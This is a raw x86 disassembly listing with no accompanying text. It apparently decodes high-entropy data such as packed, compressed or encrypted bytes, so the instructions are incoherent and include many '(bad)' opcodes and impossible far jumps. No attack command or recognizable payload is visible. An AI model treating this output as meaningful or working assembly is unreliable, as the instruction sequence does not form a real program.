  42351c:	xlat   BYTE PTR ds:[ebx]
  42351d:	dec    ecx
  42351e:	stos   BYTE PTR es:[edi],al
  42351f:	repz pop esp
  423521:	dec    edi
  423522:	pop    ebp
  423523:	jmp    esi
  423525:	mov    DWORD PTR [ecx+0xf9b30bb],esp
  42352b:	mov    al,0xee
  42352d:	les    ecx,FWORD PTR [eax+0x1e]
  423530:	jg     0x423513
  423532:	stc    
  423533:	mov    ch,0xc6
  423535:	rcl    BYTE PTR [esi-0x19],1
  423538:	sbb    al,0x7b
  42353a:	cmp    bl,BYTE PTR [ebx+0x6e]
  42353d:	push   ds
  42353e:	mov    ebp,0xec78b9fc
  423543:	push   esi
  423544:	jp     0x423519
  423546:	scas   al,BYTE PTR es:[edi]
  423547:	mov    ds:0xa77e535f,al
  42354c:	mov    dx,0xa539
  423550:	push   es
  423551:	cmc    
  423552:	mov    bl,0x2
  423554:	xchg   bh,dh
  423556:	or     dh,BYTE PTR [ecx-0x6296505b]
  42355c:	mov    bh,BYTE PTR [ecx]
  42355e:	imul   ebp,DWORD PTR gs:[eax+0x6f],0x9f24e25e
  423566:	xor    BYTE PTR [ebx],ch
  423568:	shr    DWORD PTR [ecx+0x72],cl
  42356b:	xor    eax,0x333f22cc
  423570:	pop    esp
  423571:	imul   BYTE PTR [eax-0x72a7869]
  423577:	and    DWORD PTR [esi],ecx
  423579:	addr16 test eax,0x2081a8eb
  42357f:	stos   BYTE PTR es:[edi],al
  423580:	pop    esp
  423581:	mov    esi,0x39526532
  423586:	inc    ebp
  423587:	add    DWORD PTR [esi-0x128502d5],0x9162f45e
  423591:	and    ebx,ebp
  423593:	imul   ebp,DWORD PTR [ecx+0xb],0xe3378dc5
  42359a:	inc    esp
  42359b:	lock jl 0x42354c
  42359e:	push   0xffffffe4
  4235a0:	in     al,dx
  4235a1:	xor    dl,BYTE PTR [edx]
  4235a3:	and    BYTE PTR [eax-0x24],dh
  4235a6:	xor    eax,0x1e5ff116
  4235ab:	xor    DWORD PTR [ebx-0x60a103cf],esp
  4235b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235b2:	jo     0x42355f
  4235b4:	loop   0x42356f
  4235b6:	lea    ebp,ds:[edx-0x795f1e78]
  4235bd:	dec    edx
  4235bf:	inc    ebp
  4235c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235c1:	push   ss
  4235c2:	std    
  4235c3:	aad    0x7
  4235c5:	mov    al,ds:0x35a60590
  4235ca:	cmp    DWORD PTR [edi-0x3b],esp
  4235cd:	sbb    BYTE PTR [esi+ebp*8-0x78],al
  4235d1:	(bad)  
  4235d5:	dec    cl
  4235d7:	mov    eax,ds:0x38ffa60b
  4235dc:	push   edx
  4235dd:	cli    
  4235de:	(bad)  
  4235df:	dec    esi
  4235e0:	adc    edi,0xae75dc14
  4235e6:	jne    0x423625
  4235e8:	jb     0x4235b7
  4235ea:	mov    al,ds:0x8f3aeb45
  4235ef:	(bad)  
  4235f0:	jb     0x423586
  4235f2:	mov    WORD PTR [ebp+edi*8+0x2c],?
  4235f6:	popa   
  4235f7:	stos   BYTE PTR es:[edi],al
  4235f8:	ins    DWORD PTR es:[edi],dx
  4235f9:	mov    cs,WORD PTR [ecx+0x4f]
  4235fc:	mov    ebx,0xf2b2a57a
  423601:	(bad)  
  423602:	or     ah,BYTE PTR [eax+ebx*2]
  423605:	fmul   DWORD PTR [eax-0x54c68010]
  42360b:	push   ds
  42360c:	inc    ecx
  42360d:	xor    al,0xed
  42360f:	jns    0x423657
  423611:	and    BYTE PTR [ebx],bh
  423613:	jae    0x4235a9
  423615:	sahf   
  423616:	cli    
  423617:	sub    esi,ecx
  423619:	pop    esp
  42361a:	dec    esp
  42361b:	or     esp,ecx
  42361d:	fstp   TBYTE PTR [edx]
  42361f:	pusha  
  423620:	dec    esp
  423621:	int    0xda
  423623:	jmp    0x74608913
  423628:	adc    ah,BYTE PTR [eax]
  42362a:	or     bl,dl
  42362c:	gs (bad) 
  42362e:	or     DWORD PTR [ebx-0x2f],ebp
  423631:	or     BYTE PTR [ebp+0x32],bh
  423634:	mov    dl,0x8f
  423636:	clc    
  423637:	push   eax
  423638:	pushw  0x8588
  42363c:	mov    eax,ds:0x414aba58
  423641:	push   ds
  423642:	push   ebp
  423643:	loop   0x4235e0
  423645:	xchg   cl,dh
  423647:	mov    bl,0xa1
  423649:	(bad)  
  42364a:	mov    cl,0xda
  42364c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42364d:	pop    edi
  42364e:	cli    
  42364f:	or     eax,0xce83e754
  423654:	in     eax,0xd7
  423656:	cmp    DWORD PTR gs:[eax-0x3],esp
  42365a:	aaa    
  42365b:	sbb    bh,bh
  42365d:	ins    DWORD PTR es:[edi],dx
  42365e:	push   esp
  42365f:	shl    DWORD PTR [ecx],cl
  423661:	lea    edi,[ebx-0x774e6608]
  423667:	mov    esi,0x3fa91714
  42366c:	mov    WORD PTR [eax-0x26456b03],cs
  423672:	mov    ebx,0xfa6e9886
  423677:	loop   0x423675
  423679:	xchg   BYTE PTR [ecx+0x34],cl
  42367c:	fld    QWORD PTR [edi+0x57b4f512]
  423682:	jae    0x42367f
  423684:	clc    
  423685:	lods   al,BYTE PTR ds:[esi]
  423686:	rol    edi,0x6f
  423689:	pusha  
  42368a:	aad    0x40
  42368c:	(bad)  
  42368d:	push   ebx
  42368e:	adc    ebx,ecx
  423690:	inc    ebx
  423691:	in     al,0x79
  423693:	mov    al,ds:0xec8c834d
  423698:	or     DWORD PTR [ecx+0x29],ecx
  42369b:	xor    esp,ebx
  42369d:	mov    esi,DWORD PTR [esi+ecx*8-0x1c668187]
  4236a4:	jns    0x423687
  4236a6:	(bad)  
  4236a8:	imul   ebp,DWORD PTR [esi],0xffffff87
  4236ab:	jmp    0x4236bf
  4236ad:	xchg   edi,eax
  4236ae:	lahf   
  4236af:	sbb    edi,ebx
  4236b1:	dec    edx
  4236b2:	mov    ebx,0xb8e903dd
  4236b7:	dec    esp
  4236b8:	push   edi
  4236b9:	xor    DWORD PTR [ecx-0x1bf9422a],ecx
  4236bf:	hlt    
  4236c0:	iret   
  4236c1:	in     al,dx
  4236c2:	add    al,0xa8
  4236c4:	pop    ebx
  4236c5:	sub    BYTE PTR [ebx+0x2486dcc],0xd4
  4236cc:	mov    dl,0x7c
  4236ce:	sbb    al,BYTE PTR [eax]
	...
  4236d8:	add    BYTE PTR [eax],al
  4236da:	shl    BYTE PTR [edx],cl
  4236dc:	xchg   esi,eax
  4236dd:	call   0xe61:0x6adebef6
  4236e4:	cmp    DWORD PTR [eax],esi
  4236e6:	lea    edx,[edi-0x4f3c8283]
  4236ec:	add    DWORD PTR [eax],eax
  4236ee:	std    
  4236ef:	add    DWORD PTR [eax],eax
  4236f1:	add    BYTE PTR [ebx+eiz*1+0x38],bh
  4236f5:	cmp    ch,BYTE PTR [ecx-0x17]
  4236f8:	adc    DWORD PTR [esi-0x3d],edx
  4236fb:	cdq    
  4236fc:	mov    esi,0xa0c010dd
  423701:	inc    edx
  423702:	adc    DWORD PTR [edx-0x78],ebx
  423705:	xor    ecx,DWORD PTR [ecx-0x1c9b1b6f]
  42370b:	add    edx,DWORD PTR [edx]
  42370d:	test   eax,0x25e57721
  423712:	data16 and al,0xa7
  423715:	mov    esp,0x82f823c1
  42371a:	sar    BYTE PTR [ecx+0x38fbfec0],cl
  423720:	sub    bl,ah
  423722:	or     al,0x3a
  423724:	push   ebp
  423725:	loope  0x423784
  423727:	dec    edx
  423728:	std    
  423729:	mul    DWORD PTR [edi+0x65337e5b]
  42372f:	mov    ds:0x47dcd4e,al
  423734:	add    DWORD PTR [edi+0x6df8dd78],edi
  42373a:	mov    ecx,0xbf6b3ee7
  42373f:	stos   DWORD PTR es:[edi],eax
  423740:	scas   eax,DWORD PTR es:[edi]
  423741:	popa   
  423742:	ret    
  423743:	icebp  
  423744:	pop    ecx
  423745:	xor    eax,0x8123263e
  42374a:	dec    ecx
  42374b:	ss dec esi
  42374d:	sub    DWORD PTR [eax-0x6e],0x9d1a1181
  423754:	mov    DWORD PTR [edi+0x179e6ee],ebx
  42375a:	push   es
  42375b:	inc    edi
  42375c:	jno    0x423772
  42375e:	push   ss
  42375f:	cmc    
  423760:	aam    0x7d
  423762:	scas   al,BYTE PTR es:[edi]
  423763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423764:	fmul   QWORD PTR [esi-0x4d2fc92f]
  42376a:	pop    es
  42376b:	and    eax,0x5b098399
  423770:	js     0x423780
  423772:	or     BYTE PTR [ecx],0xf4
  423775:	shl    DWORD PTR ss:0x6347b326,1
  42377c:	aam    0x73
  42377e:	mov    ebx,0x58c9cdff
  423783:	scas   al,BYTE PTR es:[edi]
  423784:	sahf   
  423785:	jne    0x42372a
  423787:	cmp    al,bl
  423789:	idiv   DWORD PTR [ebx+0xd]
  42378c:	rcr    BYTE PTR [ebx+0x53],cl
  42378f:	or     BYTE PTR [ebx],cl
  423791:	imul   esi,DWORD PTR ds:0x71858e33,0x5a555d0e
  42379b:	and    eax,0x2189e090
  4237a0:	push   cs
  4237a1:	jbe    0x423818
  4237a3:	and    al,0xa5
  4237a5:	push   ebx
  4237a6:	into   
  4237a7:	idiv   al
  4237a9:	pop    es
  4237aa:	pop    ebp
  4237ab:	mov    WORD PTR [esi-0x30],fs
  4237ae:	or     DWORD PTR [ebp-0xfbf36f2],ebp
  4237b4:	xchg   ebp,eax
  4237b5:	jge    0x42374b
  4237b7:	out    0xab,eax
  4237b9:	repz (bad)
  4237bc:	jge    0x423809
  4237be:	enter  0x1d4f,0x67
  4237c2:	outs   dx,DWORD PTR ds:[esi]
  4237c3:	int    0x98
  4237c5:	add    al,BYTE PTR [edi-0x2b]
  4237c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237c9:	repz fs mov ebp,0x8baedcff
  4237d0:	fild   WORD PTR [edi-0x59d74b8b]
  4237d6:	enter  0xfeeb,0x78
  4237da:	add    al,0xee
  4237dc:	lds    ebp,FWORD PTR [edx]
  4237de:	mov    edx,0x796a86fa
  4237e3:	or     BYTE PTR [ebp+0x38d519a2],ch
  4237e9:	inc    esp
  4237ea:	sahf   
  4237eb:	push   edi
  4237ec:	lods   al,BYTE PTR ds:[esi]
  4237ed:	shl    BYTE PTR [edx],0x5e
  4237f0:	dec    edx
  4237f1:	repz and dl,BYTE PTR [edx+0x3b]
  4237f5:	sub    dl,BYTE PTR [ebp+0xd167129]
  4237fb:	jmp    0x3bb4:0xb96961ff
  423802:	hlt    
  423803:	add    DWORD PTR [esi+eiz*1-0x3a],0x367bc3ff
  42380b:	test   DWORD PTR [ecx-0x20],ebp
  42380e:	ins    DWORD PTR es:[edi],dx
  42380f:	inc    esp
  423810:	mov    BYTE PTR [edx+edi*8],cl
  423813:	lahf   
  423814:	js     0x423837
  423816:	or     bh,BYTE PTR [esi-0x6e30ebc8]
  42381c:	stos   DWORD PTR es:[edi],eax
  42381d:	aas    
  42381e:	fcomi  st,st(7)
  423820:	jmp    0x4237e1
  423822:	ins    BYTE PTR es:[edi],dx
  423823:	jmp    0x34ce108a
  423828:	sub    al,0xc0
  42382a:	xor    bh,BYTE PTR es:[esi+0x2a]
  42382e:	lock push eax
  423830:	push   0x7aafa9ad
  423835:	imul   eax,DWORD PTR [eax+0x162446fc],0x59
  42383c:	sahf   
  42383d:	scas   eax,DWORD PTR es:[edi]
  42383e:	inc    edx
  42383f:	(bad)  
  423840:	shl    BYTE PTR [esi],1
  423842:	imul   ebp,DWORD PTR [eax-0x2e50fba7],0xfffffffd
  423849:	outs   dx,DWORD PTR ds:[esi]
  42384a:	out    0xa8,al
  42384c:	inc    dl
  42384e:	xlat   BYTE PTR ds:[ebx]
  42384f:	mov    edi,0x8e33e257
  423854:	popf   
  423855:	dec    ebp
  423856:	rcr    BYTE PTR [eax+0x5fba474b],cl
  42385c:	sbb    DWORD PTR [ebp-0x4280935d],0xffffffbd
  423863:	outs   dx,BYTE PTR ds:[esi]
  423864:	mov    BYTE PTR ds:0xb84d6c26,ch
  42386a:	cmp    DWORD PTR [eax+0x4d],esi
  42386d:	xor    DWORD PTR [ecx],0x13
  423870:	pop    ebx
  423871:	mov    dl,BYTE PTR [esi]
  423873:	data16 jae 0x423867
  423876:	xchg   ebx,eax
  423877:	es mov edx,esp
  42387a:	js     0x4237fc
  42387c:	dec    edx
  42387d:	push   eax
  42387e:	(bad)  
  42387f:	pop    ebp
  423880:	jg     0x42389d
  423882:	test   ecx,esp
  423884:	xor    DWORD PTR [ecx],ebp
  423886:	jo     0x423859
  423888:	mov    dl,0x89
  42388a:	hlt    
  42388b:	pop    ecx
  42388c:	push   ebp
  42388d:	xchg   BYTE PTR [eax-0x243493f7],al
  423893:	retf   0xaaee
  423896:	xchg   ch,ah
  423898:	pop    ss
  423899:	ins    DWORD PTR es:[edi],dx
  42389a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42389b:	fisttp QWORD PTR [eax+0x2aa4a1e0]
  4238a1:	jmp    0x4238eb
  4238a3:	or     al,BYTE PTR [esi+0xd]
  4238a6:	jne    0x423848
  4238a8:	pop    edi
  4238a9:	jecxz  0x4238c4
  4238ab:	int    0xc8
  4238ad:	aam    0x52
  4238af:	push   ebx
  4238b0:	mov    eax,ds:0x3b9b299
  4238b5:	js     0x423915
  4238b7:	add    bl,BYTE PTR [ecx+0xd35cfa]
  4238bd:	add    BYTE PTR [edx],0x46
  4238c0:	repz sub bl,BYTE PTR [esp+edx*2-0x32b5ee8a]
  4238c8:	cmp    eax,DWORD PTR [ebp-0x53]
  4238cb:	popa   
  4238cc:	mov    ds:0x5851092a,eax
  4238d1:	and    al,0x10
  4238d3:	out    0x93,eax
  4238d5:	and    eax,0x8ef84890
  4238da:	xchg   ebx,eax
  4238db:	cs jmp 0xbe49:0x6326e841
  4238e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238e4:	and    al,0xca
  4238e6:	cmp    DWORD PTR [edx-0x28],ebp
  4238e9:	cmp    al,0xce
  4238eb:	and    eax,0x8328a0
	...
  4238f8:	add    BYTE PTR [eax],al
  4238fa:	fnstsw WORD PTR [edi+ecx*4]
  4238fd:	mov    esp,0x7dffbfef
  423902:	in     al,dx
  423903:	outs   dx,BYTE PTR ds:[esi]
  423904:	fs push esp
  423906:	jo     0x423969
  423908:	and    dl,BYTE PTR [edx-0x40]
  42390b:	mov    dl,0x1
  42390d:	add    ch,bh
  42390f:	add    DWORD PTR [eax],eax
  423911:	add    BYTE PTR [ebp-0xaafc9bd],cl
  423917:	and    DWORD PTR [eax+edi*4+0x49],ecx
  42391b:	xchg   ecx,eax
  42391c:	shr    eax,0xf9
  42391f:	and    dh,BYTE PTR [edi+edx*4]
  423922:	mov    ds:0xcea9465,al
  423927:	sbb    dl,BYTE PTR [ebx-0x4cd02241]
  42392d:	fsub   DWORD PTR [edi]
  42392f:	or     ebp,DWORD PTR [edx+edx*4-0x43]
  423933:	out    dx,al
  423934:	dec    edx
  423935:	fs push es
  423937:	pusha  
  423938:	call   0x8b3a8e2a
  42393d:	xor    dh,dl
  42393f:	test   al,0x1b
  423941:	sbb    al,0x2e
  423943:	mov    ecx,0xa974356c
  423948:	jecxz  0x423915
  42394a:	fimul  DWORD PTR [ebp+ebp*8-0x36c6be96]
  423951:	(bad)  
  423952:	out    dx,al
  423953:	cs call 0x495a69e7
  423959:	xlat   BYTE PTR ds:[ebx]
  42395a:	inc    eax
  42395b:	out    0x69,al
  42395d:	in     al,dx
  42395e:	scas   eax,DWORD PTR es:[edi]
  42395f:	xor    eax,0x7ff2ed9a
  423964:	(bad)  
  423965:	sub    bh,bl
  423967:	mov    al,ds:0x1d90a657
  42396c:	mov    dh,0xa9
  42396e:	mov    edi,0xb9241840
  423973:	sbb    al,0x17
  423975:	jne    0x4239e3
  423977:	pop    edi
  423978:	dec    edi
  423979:	test   DWORD PTR [edx+0x184d62b1],edi
  42397f:	sub    BYTE PTR [esi],bh
  423981:	cmp    eax,DWORD PTR [esp+edi*2-0x3889f663]
  423988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423989:	pop    eax
  42398a:	xchg   ebx,eax
  42398b:	sbb    DWORD PTR ds:0x82ce406a,0xecf39c5
  423995:	imul   edi,esi,0x58
  423998:	(bad)  
  423999:	sub    DWORD PTR [edx],ebx
  42399b:	xchg   ecx,eax
  42399c:	inc    ebx
  42399d:	add    BYTE PTR [ebp-0x5b4a7b20],bl
  4239a3:	cmp    BYTE PTR [eax+0x35],0xc3
  4239a7:	sub    ch,BYTE PTR [edi+edi*4]
  4239aa:	in     al,dx
  4239ab:	mov    al,cl
  4239ad:	mov    cl,0x37
  4239af:	push   cs
  4239b0:	add    BYTE PTR [ecx],0x4e
  4239b3:	push   ebx
  4239b4:	sbb    ch,BYTE PTR [edi]
  4239b6:	call   0x9a86a1d1
  4239bb:	push   esi
  4239bc:	dec    ecx
  4239bd:	inc    esi
  4239be:	mov    dl,0x3b
  4239c0:	mov    edx,?
  4239c2:	mov    bh,0x4b
  4239c4:	fmul   DWORD PTR [edi]
  4239c6:	les    edi,FWORD PTR [ecx+0x76a436db]
  4239cc:	pop    ss
  4239cd:	and    DWORD PTR [esp+edx*4+0x47dd45e8],ecx
  4239d4:	imul   esi,DWORD PTR [edx],0x37
  4239d7:	test   eax,0x94e932cc
  4239dc:	inc    eax
  4239dd:	loopne 0x4239e2
  4239df:	mov    esi,0x1a98f060
  4239e4:	aad    0xcc
  4239e6:	in     eax,dx
  4239e7:	mov    al,ds:0xea7a2d4f
  4239ec:	test   DWORD PTR [eax+0x7d],ecx
  4239ef:	push   ecx
  4239f0:	sub    DWORD PTR [eax-0x17cbf62d],ecx
  4239f6:	int3   
  4239f7:	mov    edi,DWORD PTR [ecx-0x1694fdd1]
  4239fd:	jp     0x423a28
  4239ff:	and    eax,DWORD PTR [esi-0x19]
  423a02:	int3   
  423a03:	ror    DWORD PTR [ebx+0x622d7e3c],cl
  423a09:	fst    QWORD PTR [edi]
  423a0b:	dec    ebx
  423a0c:	pop    ds
  423a0d:	ss aad 0xbb
  423a10:	push   eax
  423a11:	sub    eax,0x662c6c79
  423a16:	ret    0xcf48
  423a19:	jne    0x4239e0
  423a1b:	add    ecx,ebx
  423a1d:	outs   dx,BYTE PTR ds:[esi]
  423a1e:	mov    DWORD PTR [ebx+ebp*4-0x588575d2],0xe3e930a3
  423a29:	jnp    0x423a72
  423a2b:	cmp    eax,0xc7d6fb85
  423a30:	cli    
  423a31:	or     esi,DWORD PTR [ecx]
  423a33:	hlt    
  423a34:	lods   al,BYTE PTR ds:[esi]
  423a35:	xchg   ecx,eax
  423a36:	dec    ecx
  423a37:	popa   
  423a38:	xchg   edx,eax
  423a39:	imul   edi,ebp,0x13768b97
  423a3f:	icebp  
  423a40:	xor    DWORD PTR [edi],edi
  423a42:	popf   
  423a43:	shl    BYTE PTR [ebx],cl
  423a45:	and    DWORD PTR [ecx-0x26],eax
  423a48:	loopne 0x423aa4
  423a4a:	mov    ds:0x4946ab2,al
  423a4f:	inc    eax
  423a50:	jecxz  0x4239e4
  423a52:	mov    cl,0xd4
  423a54:	jbe    0x423aa7
  423a56:	push   esi
  423a57:	xchg   esi,eax
  423a58:	not    DWORD PTR [eax+0xa]
  423a5b:	mov    edx,0x1b01dc9b
  423a60:	(bad)  
  423a61:	jmp    DWORD PTR [esp+ecx*8]
  423a64:	and    BYTE PTR [ebp-0x21],bh
  423a67:	mov    al,0x30
  423a69:	test   al,0x82
  423a6b:	sbb    ecx,DWORD PTR [ebp+edx*8+0x19]
  423a6f:	loopne 0x423ac6
  423a71:	pop    ss
  423a72:	lods   eax,DWORD PTR ds:[esi]
  423a73:	imul   esi
  423a75:	in     al,0xcb
  423a77:	je     0x423ad6
  423a79:	xlat   BYTE PTR ds:[ebx]
  423a7a:	fisttp WORD PTR [esi-0x57a60918]
  423a80:	push   0x82c2913c
  423a85:	mov    esp,0x70bc8c2c
  423a8a:	clc    
  423a8b:	xchg   esi,eax
  423a8c:	mov    esi,?
  423a8e:	ret    0x848d
  423a91:	and    edi,DWORD PTR [ecx]
  423a93:	dec    ebx
  423a94:	aad    0xb
  423a96:	sbb    DWORD PTR [eax],eax
  423a98:	cmc    
  423a99:	in     al,0xf5
  423a9b:	setno  BYTE PTR [ebx+0x4ac2dafd]
  423aa2:	pop    es
  423aa3:	fild   QWORD PTR [ebp+0x1027214c]
  423aa9:	ja     0x423a30
  423aab:	and    ebx,edx
  423aad:	sub    DWORD PTR [esi+ebp*4+0x6],eax
  423ab1:	iret   
  423ab2:	imul   edx,DWORD PTR [edx],0xf31f2798
  423ab8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ab9:	and    al,BYTE PTR [edx]
  423abb:	xchg   esi,eax
  423abc:	rol    BYTE PTR [eax+0x777ea425],0xc0
  423ac3:	pop    ecx
  423ac4:	cdq    
  423ac5:	dec    edx
  423ac6:	mov    ch,0x9d
  423ac8:	jbe    0x423a9e
  423aca:	xchg   esp,eax
  423acb:	xor    edx,DWORD PTR [ebx+0x7e80574b]
  423ad1:	addr16 ss jnp 0x423b29
  423ad5:	mov    esp,0xced25a63
  423ada:	and    DWORD PTR [edi+esi*2-0x5c1ebfe8],eax
  423ae1:	cmp    BYTE PTR [ecx-0x2e5600a7],bh
  423ae7:	add    eax,0xbf00eeb6
  423aec:	mov    ebp,DWORD PTR [ebp+ebx*2+0x36]
  423af0:	xchg   BYTE PTR [ebp-0x4925bfaf],ch
  423af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423af7:	es inc eax
  423af9:	mov    dh,0x30
  423afb:	dec    edi
  423afc:	cdq    
  423afd:	mov    ebp,0x89eacc7a
  423b02:	and    ecx,DWORD PTR [ecx+0x59]
  423b05:	fs fs inc edx
  423b08:	outs   dx,BYTE PTR ds:[esi]
  423b09:	in     eax,0x1
  423b0b:	repnz cdq 
  423b0d:	int3   
  423b0e:	retf   0x0
	...
  423b19:	add    BYTE PTR [esi-0x4fd6421],dh
  423b1f:	inc    esi
  423b20:	mov    edi,0x261aff
  423b25:	jb     0x423b4c
  423b27:	aam    0x5d
  423b29:	sbb    DWORD PTR [ebp-0x2fffe4c],edi
  423b2f:	add    DWORD PTR [eax],eax
  423b31:	add    BYTE PTR [edi+0x2d5f0278],ch
  423b37:	(bad)  
  423b38:	stos   DWORD PTR es:[edi],eax
  423b39:	jp     0x423ac3
  423b3b:	pop    edi
  423b3c:	in     al,0xdf
  423b3e:	pop    ecx
  423b3f:	sub    al,0x20
  423b41:	fild   WORD PTR ds:0xba29d69
  423b47:	xor    al,0xeb
  423b49:	mov    edx,0x64fe1104
  423b4e:	out    dx,al
  423b4f:	push   0xfffffffc
  423b51:	add    dh,BYTE PTR [ecx]
  423b53:	mov    fs,WORD PTR [edx]
  423b55:	ins    BYTE PTR es:[edi],dx
  423b56:	sub    dh,BYTE PTR [ecx]
  423b58:	in     eax,dx
  423b59:	or     ecx,DWORD PTR [ebx-0x5]
  423b5c:	xor    DWORD PTR [ebx],eax
  423b5e:	(bad)  
  423b5f:	mov    ds:0xc04069e8,eax
  423b64:	cmp    al,0x15
  423b66:	jecxz  0x423b58
  423b68:	push   edx
  423b69:	(bad)  
  423b6a:	hlt    
  423b6b:	mov    ebx,ebp
  423b6d:	xor    eax,0x8199974
  423b72:	xchg   ebx,eax
  423b73:	pop    ebp
  423b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b75:	add    BYTE PTR [ecx-0x5a],ah
  423b78:	fstp   DWORD PTR [ecx-0x40ae6dba]
  423b7e:	jmp    0xb0ca:0x12baee91
  423b85:	lods   al,BYTE PTR ds:[esi]
  423b86:	inc    ebx
  423b87:	lock lds ebp,FWORD PTR [edx]
  423b8a:	ror    BYTE PTR [ecx-0x61335dac],1
  423b90:	(bad)  
  423b91:	xlat   BYTE PTR ds:[ebx]
  423b92:	lods   eax,DWORD PTR ds:[esi]
  423b93:	ds in  al,dx
  423b95:	lods   eax,DWORD PTR ds:[esi]
  423b96:	adc    dh,BYTE PTR [esi]
  423b98:	scas   al,BYTE PTR es:[edi]
  423b99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b9a:	sub    ecx,DWORD PTR [edx]
  423b9c:	cmp    cl,bl
  423b9e:	pop    edx
  423b9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ba0:	pusha  
  423ba1:	cld    
  423ba2:	push   es
  423ba3:	add    DWORD PTR [edx-0x3d7a1a3a],esp
  423ba9:	and    eax,0xb3670053
  423bae:	(bad)  
  423baf:	jmp    0x423bc4
  423bb1:	pop    es
  423bb2:	push   edi
  423bb3:	into   
  423bb4:	arpl   dx,ax
  423bb6:	icebp  
  423bb7:	lods   al,BYTE PTR ds:[esi]
  423bb8:	pushf  
  423bb9:	jnp    0x423bfd
  423bbb:	push   ds
  423bbc:	and    al,0xbd
  423bbe:	mov    cl,0x8c
  423bc0:	out    dx,eax
  423bc1:	fadd   QWORD PTR [ecx+0x2c7fa75d]
  423bc7:	dec    esi
  423bc8:	cmp    edx,esi
  423bca:	mov    ecx,0x1dfef56
  423bcf:	test   BYTE PTR [esi-0x1540d051],bl
  423bd5:	jns    0x423c4c
  423bd7:	xor    edx,esi
  423bd9:	sbb    BYTE PTR [edx],bl
  423bdb:	ins    BYTE PTR es:[edi],dx
  423bdc:	addr16 add al,0x23
  423bdf:	xchg   ecx,eax
  423be0:	fld    DWORD PTR [ebp+0x6f]
  423be3:	jp     0x423bd3
  423be5:	arpl   di,bp
  423be7:	xor    DWORD PTR [esi+ebp*8-0x58],ecx
  423beb:	addr16 pop eax
  423bed:	mov    al,0x4b
  423bef:	push   ecx
  423bf0:	out    0x32,al
  423bf2:	jb     0x423c24
  423bf4:	repz div BYTE PTR [esp+ebp*2]
  423bf8:	mov    ebx,ebp
  423bfa:	mov    fs,edx
  423bfc:	push   esp
  423bfd:	int    0xdd
  423bff:	sub    BYTE PTR [ecx+ebp*1-0x24e6fa79],dl
  423c06:	xchg   BYTE PTR [eax-0x243da1c5],bh
  423c0c:	cmp    BYTE PTR [ebp+0x234b9ee9],al
  423c12:	(bad)  
  423c13:	shl    BYTE PTR [eax+0x5a],1
  423c16:	jns    0x423c10
  423c18:	jne    0x423c30
  423c1a:	cmp    esi,DWORD PTR [eax+0x6f]
  423c1d:	and    DWORD PTR [ebx+0x6e64b80e],ebp
  423c23:	sbb    bl,BYTE PTR [esi]
  423c25:	inc    esp
  423c26:	pop    esp
  423c27:	outs   dx,DWORD PTR ds:[esi]
  423c28:	inc    edi
  423c29:	cs fs scas eax,DWORD PTR es:[edi]
  423c2c:	lahf   
  423c2d:	mov    al,ds:0x1003167b
  423c32:	fmul   QWORD PTR [eax+0x5d1555fe]
  423c38:	jbe    0x423bd2
  423c3a:	sahf   
  423c3b:	fs push edi
  423c3d:	in     eax,dx
  423c3e:	mov    eax,ss
  423c40:	mov    ds,WORD PTR [ecx]
  423c42:	scas   eax,DWORD PTR es:[edi]
  423c43:	(bad)  
  423c44:	aas    
  423c45:	es pop esp
  423c47:	xor    edx,ebx
  423c49:	aad    0x3e
  423c4b:	mov    edi,0xcf6b7390
  423c50:	inc    ebx
  423c51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c52:	push   ss
  423c53:	pusha  
  423c54:	dec    ecx
  423c55:	mov    edx,0x168a6558
  423c5a:	or     BYTE PTR [edx],bh
  423c5c:	cmp    DWORD PTR [edi-0x4d887b16],ecx
  423c62:	les    esi,FWORD PTR [eax-0x78311177]
  423c68:	dec    eax
  423c69:	add    ah,BYTE PTR [edx-0x26bc2299]
  423c6f:	inc    ebx
  423c70:	pop    edi
  423c71:	mov    ebp,0x1d6162c
  423c76:	loopne 0x423c7e
  423c78:	mov    cl,0x8f
  423c7a:	fisttp WORD PTR [edi]
  423c7c:	jge    0x423cf6
  423c7e:	mov    edx,0x5adaec79
  423c83:	mov    al,0xde
  423c85:	mov    bh,0xf
  423c87:	add    dl,dl
  423c89:	adc    BYTE PTR [ecx],dh
  423c8b:	arpl   WORD PTR [ebx+0x574e4760],ax
  423c91:	popa   
  423c92:	data16 and al,0x49
  423c95:	rol    BYTE PTR [edx+0x7e9945fa],1
  423c9b:	mov    WORD PTR [ebp+edx*4-0x27],fs
  423c9f:	sbb    BYTE PTR [eax+0x460f5502],0x3a
  423ca6:	cs xchg edx,eax
  423ca8:	int3   
  423ca9:	retf   
  423caa:	aad    0x4c
  423cac:	cmp    DWORD PTR [edi],ebp
  423cae:	xchg   esp,eax
  423caf:	push   cs
  423cb0:	cld    
  423cb1:	mov    dh,0xeb
  423cb3:	nop
  423cb4:	leave  
  423cb5:	sbb    DWORD PTR [edx+0x7f15b9b8],0x1e237502
  423cbf:	ins    BYTE PTR es:[edi],dx
  423cc0:	(bad)  
  423cc1:	into   
  423cc2:	push   edx
  423cc3:	pop    ecx
  423cc4:	das    
  423cc5:	sbb    bh,BYTE PTR [esi-0x49]
  423cc8:	and    eax,0xaec21f5e
  423ccd:	fisub  DWORD PTR [ebp-0x7e7524ee]
  423cd3:	push   es
  423cd4:	mov    eax,0x398d8b50
  423cd9:	mov    dl,dl
  423cdb:	push   ebp
  423cdc:	add    edx,eax
  423cde:	jb     0x423d5c
  423ce0:	push   ecx
  423ce1:	xor    edi,edi
  423ce3:	xchg   esp,eax
  423ce4:	pop    edi
  423ce5:	jns    0x423cd6
  423ce7:	push   ebp
  423ce8:	jns    0x423ced
  423cea:	ror    DWORD PTR [esi],0x9c
  423ced:	sar    BYTE PTR [ebp-0x32],0x9c
